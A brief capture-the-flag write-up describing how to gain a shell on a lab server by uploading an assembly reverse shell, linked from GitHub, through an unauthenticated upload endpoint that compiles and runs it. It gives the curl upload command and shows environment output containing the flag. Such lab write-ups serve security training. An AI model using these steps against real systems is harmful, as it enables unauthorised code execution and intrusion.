# CTF Reversing-Challenge | Shell Assembly Writeup: Medium

## Challenge Overview

  - You have gotten upload access to a core file of a server, now its time to expand priviliges. The core file in question is an assembly raw file, that automatically gets compiled and executed.
  - The script is using elf64 as a syntax.
  - The standard C library is available on the system.

## Steps to Solve

1. **Create a reverse shell script**:
   Or maybe just take one from GitHub:
   https://github.com/Xre0uS/linux-reverse-shell-in-assembly


2. **Uploading the Script**
We have a user compromised, he is called FlagFrenzy. Somehow it was forgotten to set a password on the user though. Time to upload as the user with the following command.
```sh
curl -XPOST -F 'data=@script.asm' localhost:3000/upload?key=FlagFrenzy
```

3. **Search for the flag**
The flag is inside the environment parameters.  
```sh
/ # printenv 
NODE_VERSION=14.21.3
HOSTNAME=20da255c7947
YARN_VERSION=1.22.19
SHLVL=1
HOME=/root
OLDPWD=/code
KEY_FlagFrenzy=/uploads/assembly-script.asm
STATIC_FLAG="FF{5155e13add408c374b3b26bbbbb3d8a7}"
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/
NODE_ENV=production
```

